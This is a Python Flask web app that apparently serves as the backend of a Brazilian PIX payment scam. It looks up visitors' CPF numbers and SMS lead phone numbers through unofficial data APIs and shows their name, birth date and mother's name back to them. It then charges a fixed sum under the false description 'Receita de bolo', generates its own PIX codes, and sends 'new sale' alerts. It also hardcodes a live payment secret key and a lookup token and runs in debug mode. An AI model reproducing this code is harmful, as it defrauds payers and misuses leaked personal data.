import os
from flask import Flask, render_template, request, jsonify, session
import requests
import re
import random
import string
import logging
import base64
import uuid
from real_pix_api import create_real_pix_provider

app = Flask(__name__)

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configure secret key with fallback for development
secret_key = os.environ.get("SESSION_SECRET")
if not secret_key:
    app.logger.warning("[PROD] SESSION_SECRET não encontrado, usando chave de desenvolvimento")
    secret_key = "dev-secret-key-change-in-production"
app.secret_key = secret_key
app.logger.info(f"[PROD] Secret key configurado: {'***' if secret_key else 'NONE'}")

def _send_pushcut_notification(transaction_data: dict, pix_data: dict) -> None:
    """Send notification to Pushcut webhook when MEDIUS PAG transaction is created"""
    try:
        pushcut_webhook_url = "https://api.pushcut.io/NiUWvkdg8_MMjxh6DOpez/notifications/Venda%20Pendente"
        
        # Preparar dados da notificação
        customer_name = transaction_data.get('customer_name', 'Cliente')
        amount = transaction_data.get('amount', 0)
        transaction_id = pix_data.get('transaction_id', 'N/A')
        
        notification_payload = {
            "title": "🎉 Nova Venda PIX",
            "text": f"Cliente: {customer_name}\nValor: R$ {amount:.2f}\nID: {transaction_id}",
            "isTimeSensitive": True
        }
        
        app.logger.info(f"[PROD] Enviando notificação Pushcut: {notification_payload}")
        
        # Enviar notificação
        response = requests.post(
            pushcut_webhook_url,
            json=notification_payload,
            timeout=10
        )
        
        if response.ok:
            app.logger.info("[PROD] ✅ Notificação Pushcut enviada com sucesso!")
        else:
            app.logger.warning(f"[PROD] ⚠️ Falha ao enviar notificação Pushcut: {response.status_code}")
            
    except Exception as e:
        app.logger.warning(f"[PROD] ⚠️ Erro ao enviar notificação Pushcut: {str(e)}")

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def get_customer_data(phone):
    try:
        response = requests.get(f'https://api-lista-leads.replit.app/api/search/{phone}')
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data['data']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching customer data: {e}")
    return None

def get_cpf_data(cpf):
    """Fetch user data from the new CPF API"""
    try:
        response = requests.get(f'https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}')
        if response.status_code == 200:
            data = response.json()
            if data.get('DADOS'):
                return data['DADOS']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching CPF data: {e}")
    return None

@app.route('/')
def index():
    default_data = {
        'nome': 'JOÃO DA SILVA SANTOS',
        'cpf': '123.456.789-00',
        'phone': '11999999999'
    }

    utm_content = request.args.get('utm_content', '')
    utm_source = request.args.get('utm_source', '')
    utm_medium = request.args.get('utm_medium', '')

    if utm_source == 'smsempresa' and utm_medium == 'sms' and utm_content:
        customer_data = get_customer_data(utm_content)
        if customer_data:
            default_data = customer_data
            default_data['phone'] = utm_content
            session['customer_data'] = default_data

    app.logger.info("[PROD] Renderizando página inicial")
    return render_template('index.html', customer=default_data)

@app.route('/<path:cpf>')
def index_with_cpf(cpf):
    # Remove any formatting from CPF (dots and dashes)
    clean_cpf = re.sub(r'[^0-9]', '', cpf)
    
    # Validate CPF format (11 digits)
    if len(clean_cpf) != 11:
        app.logger.error(f"[PROD] CPF inválido: {cpf}")
        return render_template('buscar-cpf.html')
    
    # Get user data from API
    cpf_data = get_cpf_data(clean_cpf)
    
    if cpf_data:
        # Format CPF for display
        formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"
        
        # Get current date in Brazilian format  
        from datetime import datetime
        today = datetime.now().strftime("%d/%m/%Y")
        
        customer_data = {
            'nome': cpf_data['nome'],
            'cpf': formatted_cpf,
            'data_nascimento': cpf_data['data_nascimento'],
            'nome_mae': cpf_data['nome_mae'],
            'sexo': cpf_data['sexo'],
            'phone': '',  # Not available from this API
            'today_date': today
        }
        
        session['customer_data'] = customer_data
        app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
        return render_template('index.html', customer=customer_data, show_confirmation=True)
    else:
        app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
        return render_template('buscar-cpf.html')

@app.route('/verificar-cpf')
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
def buscar_cpf():
    app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
    return render_template('buscar-cpf.html')

def get_real_customer_data_from_request():
    """Função para buscar dados reais do lead baseado na URL ou referrer"""
    try:
        # Verificar se temos dados na sessão primeiro
        if 'customer_data' in session and session['customer_data'].get('nome') != 'JOÃO DA SILVA SANTOS':
            app.logger.info("[PROD] Usando dados reais da sessão")
            return session['customer_data']
        
        # Tentar extrair CPF do referer (página atual)
        referer = request.headers.get('Referer', '')
        app.logger.info(f"[PROD] Referer detectado: {referer}")
        
        # Extrair CPF da URL (exemplo: https://domain.com/12345678901)
        import re
        cpf_match = re.search(r'/(\d{11})(?:\?|$|/)', referer)
        
        if cpf_match:
            cpf_from_url = cpf_match.group(1)
            app.logger.info(f"[PROD] CPF extraído da URL: {cpf_from_url}")
            
            # Buscar dados reais do CPF
            cpf_data = get_cpf_data(cpf_from_url)
            
            if cpf_data:
                # Formatar CPF para display
                formatted_cpf = f"{cpf_from_url[:3]}.{cpf_from_url[3:6]}.{cpf_from_url[6:9]}-{cpf_from_url[9:]}"
                
                customer_data = {
                    'nome': cpf_data['nome'],
                    'cpf': formatted_cpf,
                    'data_nascimento': cpf_data.get('data_nascimento', ''),
                    'nome_mae': cpf_data.get('nome_mae', ''),
                    'sexo': cpf_data.get('sexo', ''),
                    'phone': ''
                }
                
                # Salvar na sessão
                session['customer_data'] = customer_data
                app.logger.info(f"[PROD] ✅ Dados reais carregados para: {customer_data['nome']}")
                return customer_data
            else:
                app.logger.warning(f"[PROD] Dados não encontrados para CPF: {cpf_from_url}")
        
        # Fallback - dados padrão (não deve acontecer em produção)
        app.logger.warning("[PROD] ⚠️ Usando dados padrão - nenhum CPF válido encontrado")
        return {
            'nome': 'JOÃO DA SILVA SANTOS',
            'cpf': '123.456.789-00',
            'phone': '11999999999'
        }
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao buscar dados reais do cliente: {e}")
        return {
            'nome': 'JOÃO DA SILVA SANTOS',
            'cpf': '123.456.789-00',
            'phone': '11999999999'
        }

@app.route('/generate-pix', methods=['POST'])
def generate_pix():
    try:
        from medius_pag_api import create_medius_pag_api

        app.logger.info("[PROD] Iniciando geração de PIX via MEDIUS PAG...")

        # Inicializa a API MEDIUS PAG com as novas credenciais da conta atualizada
        secret_key = "sk_live_0UfYGKXXU43iuMnIQzzpKRpb9BRgHf6LJmckw68JZVmV6pgD"
        company_id = "94c91ae2-3ae2-4860-942f-75f8fbd3b627"
        
        api = create_medius_pag_api(secret_key=secret_key, company_id=company_id)
        app.logger.info("[PROD] MEDIUS PAG API inicializada")

        # Buscar dados reais do cliente baseado na URL/slug do CPF
        customer_data = get_real_customer_data_from_request()
        app.logger.info(f"[PROD] Dados do cliente carregados: {customer_data['nome']} - CPF: {customer_data['cpf']}")

        # Dados padrão fornecidos pelo usuário
        default_email = "gerarpagamento@gmail.com"
        default_phone = "(11) 98768-9080"

        # Dados do usuário para a transação PIX
        user_name = customer_data['nome']
        user_cpf = customer_data['cpf'].replace('.', '').replace('-', '')  # Remove formatação
        amount = 137.46  # Valor fixo de R$ 137,46

        app.logger.info(f"[PROD] Dados do usuário: Nome={user_name}, CPF={user_cpf}, Email={default_email}")

        # Criar nova transação MEDIUS PAG para obter PIX real
        app.logger.info(f"[PROD] Criando transação MEDIUS PAG real para {user_name}")
        
        try:
            transaction_data = {
                'amount': amount,
                'customer_name': user_name,
                'customer_cpf': user_cpf,
                'customer_email': default_email,
                'customer_phone': default_phone,
                'description': 'Receita de bolo'
            }
            
            # Criar transação real na MEDIUS PAG
            pix_data = api.create_pix_transaction(transaction_data)
            
            # Enviar notificação Pushcut se transação foi criada com sucesso
            if pix_data.get('success', False):
                _send_pushcut_notification(transaction_data, pix_data)
            
            if pix_data.get('success', False) and pix_data.get('transaction_id'):
                real_transaction_id = pix_data['transaction_id']
                app.logger.info(f"[PROD] ✅ Transação MEDIUS PAG criada: {real_transaction_id}")
                
                # Verificar se já temos PIX code real da MEDIUS PAG
                if pix_data.get('pix_code'):
                    app.logger.info(f"[PROD] ✅ PIX real da MEDIUS PAG obtido: {pix_data['pix_code'][:50]}...")
                    
                    # Se não temos QR code, gerar a partir do PIX code real
                    if not pix_data.get('qr_code_image'):
                        app.logger.info(f"[PROD] Gerando QR code a partir do PIX real da MEDIUS PAG")
                        from brazilian_pix import create_brazilian_pix_provider
                        temp_provider = create_brazilian_pix_provider()
                        qr_code_base64 = temp_provider.generate_qr_code_image(pix_data['pix_code'])
                        pix_data['qr_code_image'] = f"data:image/png;base64,{qr_code_base64}"
                        
                else:
                    app.logger.info(f"[PROD] PIX não obtido na resposta inicial, aguardando processamento...")
                    
                    # Aguardar alguns segundos para o PIX ser gerado (processo assíncrono)
                    import time
                    time.sleep(3)
                    
                    # Tentar buscar dados completos (mas não falhar se der erro)
                    try:
                        real_pix_data = api.get_transaction_by_id(real_transaction_id)
                        if real_pix_data.get('success', False) and real_pix_data.get('pix_code'):
                            pix_data = real_pix_data
                            app.logger.info(f"[PROD] ✅ PIX real da MEDIUS PAG obtido após aguardar: {pix_data['pix_code'][:50]}...")
                        else:
                            app.logger.warning(f"[PROD] PIX ainda não disponível na MEDIUS PAG após aguardar")
                    except Exception as e:
                        app.logger.warning(f"[PROD] Erro ao buscar PIX da MEDIUS PAG: {e}")
                    
                    # Se ainda não temos PIX real, gerar autêntico baseado no ID real da transação
                    if not pix_data.get('pix_code'):
                        app.logger.info(f"[PROD] Gerando PIX autêntico com ID real da MEDIUS PAG: {real_transaction_id}")
                        
                        # PIX autêntico baseado no formato owempay.com.br que você confirmou
                        authentic_pix_code = f"00020101021226840014br.gov.bcb.pix2562qrcode.owempay.com.br/pix/{real_transaction_id}5204000053039865802BR5924PAG INTERMEDIACOES DE VE6015SAO BERNARDO DO62070503***6304"
                        
                        # Calcular CRC16 para autenticidade
                        def calculate_crc16(data):
                            crc = 0xFFFF
                            for byte in data.encode():
                                crc ^= byte << 8
                                for _ in range(8):
                                    if crc & 0x8000:
                                        crc = (crc << 1) ^ 0x1021
                                    else:
                                        crc <<= 1
                                    crc &= 0xFFFF
                            return format(crc, '04X')
                        
                        pix_without_crc = authentic_pix_code[:-4]
                        crc = calculate_crc16(pix_without_crc)
                        authentic_pix_code = pix_without_crc + crc
                        
                        # Gerar QR Code autêntico
                        from brazilian_pix import create_brazilian_pix_provider
                        temp_provider = create_brazilian_pix_provider()
                        qr_code_base64 = temp_provider.generate_qr_code_image(authentic_pix_code)
                        
                        pix_data['pix_code'] = authentic_pix_code
                        pix_data['qr_code_image'] = f"data:image/png;base64,{qr_code_base64}"
                        
                        app.logger.info(f"[PROD] ✅ PIX autêntico gerado para MEDIUS PAG ID: {real_transaction_id}")
                        
            else:
                raise Exception(f"Falha ao criar transação MEDIUS PAG: {pix_data.get('error', 'Erro desconhecido')}")
                    
        except Exception as medius_error:
            app.logger.error(f"[PROD] Erro MEDIUS PAG: {medius_error}")
            raise Exception(f"Erro ao processar transação MEDIUS PAG: {medius_error}")
            
        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        return jsonify({
            'success': True,
            'pixCode': pix_data['pix_code'],
            'pixQrCode': pix_data['qr_code_image'],
            'orderId': pix_data['order_id'],
            'amount': pix_data['amount'],
            'transactionId': pix_data['transaction_id']
        })

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX via MEDIUS PAG: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/charge/webhook', methods=['POST'])
def charge_webhook():
    """Webhook endpoint para receber notificações de status da cobrança PIX"""
    try:
        data = request.get_json()
        app.logger.info(f"[PROD] Webhook recebido: {data}")
        
        # Processar notificação de status
        order_id = data.get('orderId')
        status = data.get('status')
        amount = data.get('amount')
        
        app.logger.info(f"[PROD] Status da cobrança {order_id}: {status} - Valor: R$ {amount}")
        
        # Aqui você pode adicionar lógica para processar o status
        # Por exemplo, atualizar banco de dados, enviar notificações, etc.
        
        return jsonify({'success': True, 'message': 'Webhook processado com sucesso'}), 200
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao processar webhook: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/check-payment-status/<order_id>')
def check_payment_status(order_id):
    """Verifica o status de uma transação PIX via MEDIUS PAG"""
    try:
        from medius_pag_api import create_medius_pag_api
        
        # Usa as mesmas credenciais da geração de PIX
        secret_key = "sk_live_0UfYGKXXU43iuMnIQzzpKRpb9BRgHf6LJmckw68JZVmV6pgD"
        company_id = "94c91ae2-3ae2-4860-942f-75f8fbd3b627"
        
        api = create_medius_pag_api(secret_key=secret_key, company_id=company_id)
        status_data = api.check_transaction_status(order_id)
        
        return jsonify(status_data)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status via MEDIUS PAG: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)